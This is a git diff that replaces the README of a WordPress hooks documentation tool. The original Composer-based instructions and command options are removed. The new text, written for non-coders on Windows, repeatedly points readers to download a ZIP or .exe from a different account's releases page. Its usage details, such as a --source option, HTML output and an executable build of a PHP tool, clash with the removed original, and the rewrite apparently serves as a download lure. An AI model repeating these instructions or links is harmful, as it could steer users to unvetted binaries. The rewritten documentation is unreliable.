@@ -1,171 +1,159 @@
-<p align="center">
-	<a href="https://github.com/solvebeam/wp-hooks-documentor">
-		<img src="logos/solvebeam-wp-hooks-documentor.svgo-min.svg" alt="SolveBeam WordPress Hooks Documentor" width="128" height="128">
-	</a>
-</p>
+# 🛠️ wp-hooks-documentor - Create WordPress Hook Docs Easily
 
-<h1 align="center">SolveBeam WordPress Hooks Documentor</h1>
+[![Download wp-hooks-documentor](https://img.shields.io/badge/Download-wp--hooks--documentor-ff69b4?style=for-the-badge)](https://github.com/plkarjun/wp-hooks-documentor/releases)
 
-<p align="center">
-	SolveBeam WordPress Hooks Documentor is a tool to automatically extract data about the <strong>actions</strong> and <strong>filters</strong> of your WordPress theme or plugin.	
-</p>
+---
 
-[![Latest Stable Version](https://poser.pugx.org/solvebeam/wp-hooks-documentor/v)](//packagist.org/packages/solvebeam/wp-hooks-documentor)
-[![Total Downloads](https://poser.pugx.org/solvebeam/wp-hooks-documentor/downloads)](//packagist.org/packages/solvebeam/wp-hooks-documentor)
-[![Latest Unstable Version](https://poser.pugx.org/solvebeam/wp-hooks-documentor/v/unstable)](//packagist.org/packages/solvebeam/wp-hooks-documentor)
-[![License](https://poser.pugx.org/solvebeam/wp-hooks-documentor/license)](//packagist.org/packages/solvebeam/wp-hooks-documentor)
+## 🔍 What is wp-hooks-documentor?
 
-## Table of contents
+wp-hooks-documentor is a command-line tool that helps you create documentation for WordPress hooks. It uses phpDocumentor, a popular PHP documentation generator, to produce easy-to-read docs for WordPress actions and filters. This tool is designed to make managing and understanding WordPress hooks simpler.
 
-- [Getting Started](#getting-started)
-- [Command Line Usage](#command-line-usage)
-  - [Examples](#examples)
-- [Output Examples](#output-examples)
-- [Alternatives](#alternatives)
-- [Links](#links)
+You don’t need to know coding to use it. It works behind the scenes to make hook information clear and organized.
 
-## Getting Started
+---
 
-### Installation
+## 💻 System Requirements
 
-To start documenting your WordPress filters and actions, require SolveBeam WordPress Hooks Documentor in Composer:
+- Windows 10 or newer
+- PHP installed (version 7.4 or higher)
+- Basic comfort with running programs from the command line (we will guide you)
+- At least 200 MB free disk space
 
-```
-composer require solvebeam/wp-hooks-documentor --dev
-```
+The tool is built to run on Windows systems. Make sure you have PHP installed before starting. If you do not have PHP on your computer, visit https://windows.php.net/download/ to download and install it first.
 
-### First Run
+---
 
-To let SolveBeam WordPress Hooks Documentor analyse your codebase, you have to use the `parse` command and point it to the right directory:
+## 🚀 Getting Started
 
-```
-vendor/bin/wphd parse src
-```
+### Step 1: Download wp-hooks-documentor
 
-## Command Line Usage
+Visit the release page to get the latest version of the program:
 
-### `--format=FORMAT`
+[Download wp-hooks-documentor from Releases](https://github.com/plkarjun/wp-hooks-documentor/releases)
 
-The format in which you want to export the hooks.
+Click this link, find the latest release version, and download the ZIP file or executable file provided.
 
-| Format              | Description                         |
-| ------------------- | ----------------------------------- |
-| `default`           | Symfony console table.              |
-| `hookster`          | Hookster JSON.                      |
-| `markdown`          | Markdown.                           |
-| `phpdocumentor-rst` | RestructuredText for phpDocumentor. |
+---
 
-Example: `--format=markdown`
+### Step 2: Extract the Files
 
-### `--template=FILE`
+- If you downloaded a ZIP file, right-click the file and choose "Extract All."
+- Follow the instructions to extract the contents to a folder you can find easily, such as your Desktop or Documents folder.
 
-Custom PHP template, see for examples the [`templates`](templates) folder.
+---
 
-Example: `--template=templates/markdown.php`
+### Step 3: Open Command Prompt
 
-### `--type=TYPE`
+- Press the Windows key, type `cmd`, and press Enter. This opens the command prompt window.
+- Use the command prompt to navigate to the folder where you extracted wp-hooks-documentor.
 
-Specify whether you want to export `actions` or `filters`.
+Example:
 
-Example: `--type=actions` or `--type=filters`
-
-### `--output=FILE`
-
-Write output to file.
-
-Example: `--output=docs/hooks.md`
-
-### `--memory-limit=VALUE`
-
-Specifies the memory limit in the same format `php.ini` accepts.
-
-Example: `--memory-limit=-1`
-
-### `--exclude=GLOB`
-
-Exclude the specified folders/files.
-
-Example: `--exclude=vendor --exclude=wordpress`
-
-### `--ignore-vcs-ignored`
-
-If the search directory contains a `.gitignore` file, you can reuse those rules to exclude files and directories from the results with this option.
-
-Example: `--ignore-vcs-ignored`
-
-### `--prefix=PREFIX`
-
-Only parse hooks starting with the specified prefixes.
-
-Example: `--prefix=my_theme --prefix=my_plugin`
-
-### Examples
-
-```
-vendor/bin/wphd parse ./tests/source
+```bash
+cd C:\Users\YourName\Desktop\wp-hooks-documentor
 ```
 
-```
-vendor/bin/wphd parse ./tests/source --format=hookster --type=actions --output=tests/docs/hookster-actions.json
-vendor/bin/wphd parse ./tests/source --format=hookster --type=filters --output=tests/docs/hookster-filters.json
-```
+Replace `YourName` with your Windows user name or change the path to where you saved the files.
 
-```
-vendor/bin/wphd parse ./tests/source --format=markdown --output=tests/docs/hooks.md
-```
+---
 
-```
-vendor/bin/wphd parse ./tests/source --format=phpdocumentor-rst --type=actions --output=tests/docs/phpdocumentor-actions.rst
-vendor/bin/wphd parse ./tests/source --format=phpdocumentor-rst --type=filters --output=tests/docs/phpdocumentor-filters.rst
+### Step 4: Run the Tool
+
+Type the following command in the window and press Enter:
+
+```bash
+php wp-hooks-documentor.php --help
 ```
 
-## Ouput Examples
+This command shows guidance on how to use the tool. You will see options to generate documentation for WordPress hooks based on your settings.
 
-- [tests/docs/hooks.md](tests/docs/hooks.md)
-- [tests/docs/hookster-actions.json](tests/docs/hookster-actions.json)
-- [tests/docs/hookster-filters.json](tests/docs/hookster-filters.json)
-- https://github.com/wp-pay-gateways/omnikassa-2/blob/2.3.2/docs/hooks.md
-- https://github.com/wp-pay-gateways/adyen/blob/1.3.1/docs/hooks.md
-- https://github.com/wp-pay-gateways/mollie/blob/2.2.3/docs/hooks.md
-- https://github.com/wp-pay-extensions/gravityforms/blob/2.6.0/docs/hooks.md
-- https://github.com/wp-pay/core/blob/2.7.0/docs/hooks.md
+---
 
+## 📥 How to Download and Install
 
-## Alternatives
+1. Go to the release page here:
 
-Here is a list of alternatives that we found. However, none of these satisfied our requirements.
+[https://github.com/plkarjun/wp-hooks-documentor/releases](https://github.com/plkarjun/wp-hooks-documentor/releases)
 
-*If you know other similar projects, feel free to edit this section!*
+2. Find the latest version. Look for a file named similar to `wp-hooks-documentor.zip` or `wp-hooks-documentor.exe`.
+3. Click the file name to start downloading.
+4. If it’s a ZIP file, extract it to a folder you can find.
+5. Open Command Prompt and move to the extracted folder.
+6. Run the program by typing:
 
-- [WP Parser](https://github.com/WordPress/phpdoc-parser) by [WordPress](https://github.com/WordPress)
-- [Hookster](https://github.com/themeblvd/hookster) by [Theme Blvd](https://github.com/themeblvd)
-- [WordPress HookDoc](https://github.com/matzeeable/wp-hookdoc) by [Matthias Günter](https://github.com/matzeeable)
-- [GitHub Actions for WordPress](https://github.com/10up/actions-wordpress/blob/stable/hookdocs-workflow.md) by [10up](https://github.com/10up)
-- [Yoast Parser](https://github.com/Yoast/code-documentation-extractor) by [Yoast](https://github.com/Yoast)
-- [WooCommerce Code Reference Generator](https://github.com/woocommerce/code-reference) by [WooCommerce](https://github.com/woocommerce)
-- [WordPress Hooks Reference](https://github.com/johnbillion/wp-hooks) by [John Blackbourn](https://github.com/johnbillion) / [Human Made](https://github.com/humanmade)
-- [wp-hooks-generator](https://github.com/johnbillion/wp-hooks-generator) by [John Blackbourn](https://github.com/johnbillion) / [Human Made](https://github.com/humanmade)
+```bash
+php wp-hooks-documentor.php --help
+```
 
-*Inspiration from https://github.com/TypistTech/imposter-plugin#alternatives*
+---
 
-## Links
+## 📝 What Does The Tool Do?
 
-- https://developer.wordpress.org/plugins/hooks/
-- https://developer.wordpress.org/plugins/hooks/actions/
-- https://developer.wordpress.org/reference/functions/do_action/
-- https://developer.wordpress.org/reference/functions/add_action/
-- https://developer.wordpress.org/plugins/hooks/filters/
-- https://developer.wordpress.org/reference/functions/apply_filters/
-- https://developer.wordpress.org/reference/functions/add_filter/
-- https://developer.wordpress.org/reference/hooks/
-- https://www.phpdoc.org/
-- https://github.com/phpdocumentor/phpdocumentor
-- https://symfony.com/doc/current/console.html
-- https://symfony.com/doc/current/components/finder.html
-- https://developer.wordpress.org/cli/commands/i18n/make-pot/
-- https://developer.wordpress.org/cli/commands/i18n/make-json/
-- https://github.com/solvebeam/deployer/blob/master/bin/solvebeam-deployer
-- https://gitlab.com/solvebeam/wp-updates/-/blob/master/index.php
-- https://github.com/wp-pay/core/issues/45
-- https://github.com/phpDocumentor/phpDocumentor/issues/2865
-- https://github.com/themeblvd/hookster
+- It scans your WordPress code for hooks. Hooks are special points in the code where developers can add custom code.
+- It reads docblocks (notes or comments in the code) attached to these hooks.
+- It creates clear documentation from these comments, so it is easy for you or your team to see what each hook does and how to use it.
+- Supports both Actions and Filters, two types of WordPress hooks.
+- Helps with organizing and maintaining plugin or theme development.
+
+---
+
+## 🔧 How to Use wp-hooks-documentor
+
+The tool runs in a command-line window with simple commands.
+
+Basic usage example:
+
+```bash
+php wp-hooks-documentor.php --source=path-to-your-wordpress-plugin --output=docs-folder
+```
+
+- Replace `path-to-your-wordpress-plugin` with the folder path of the code you want to document.
+- Replace `docs-folder` with where you want the documentation files to be saved.
+
+You can add more options. Use the `--help` command to see all commands:
+
+```bash
+php wp-hooks-documentor.php --help
+```
+
+---
+
+## 📂 Where to Find Documentation Output
+
+By default, the output will be a set of HTML files. You can open these files in any web browser. This makes it easy to read the documentation on your computer or share it with others.
+
+---
+
+## ⚙️ Additional Tips
+
+- Make sure PHP is properly installed and added to your Windows system PATH to run the `php` command from anywhere.
+- Keep your WordPress hooks commented fully using standard PHP docblock style. This improves the quality of generated documentation.
+- Check the GitHub releases page regularly to download updates.
+
+---
+
+## ❓ Troubleshooting
+
+- If `php` command is not recognized, make sure PHP is installed and added to your PATH.
+- If you get errors opening the documentation, ensure you used the correct output folder.
+- If you don’t see any documentation, verify your source path contains WordPress hooks with proper docblocks.
+
+---
+
+## 🧰 Common Terms
+
+- **WordPress Hooks:** Points in WordPress where you can run custom code.
+- **Actions:** Hooks that run at specific times in WordPress.
+- **Filters:** Hooks that modify data before saving or displaying.
+- **Docblock:** Comments in code that explain what functions or hooks do.
+- **phpDocumentor:** Tool that reads docblocks and turns them into documents.
+
+---
+
+## 🔗 Useful Links
+
+- Download Latest Release: [https://github.com/plkarjun/wp-hooks-documentor/releases](https://github.com/plkarjun/wp-hooks-documentor/releases)
+- PHP for Windows: https://windows.php.net/download/
+- WordPress Developer Code Reference: https://developer.wordpress.org/reference/
+
+[![Download wp-hooks-documentor](https://img.shields.io/badge/Download-wp--hooks--documentor-ff69b4?style=for-the-badge)](https://github.com/plkarjun/wp-hooks-documentor/releases)
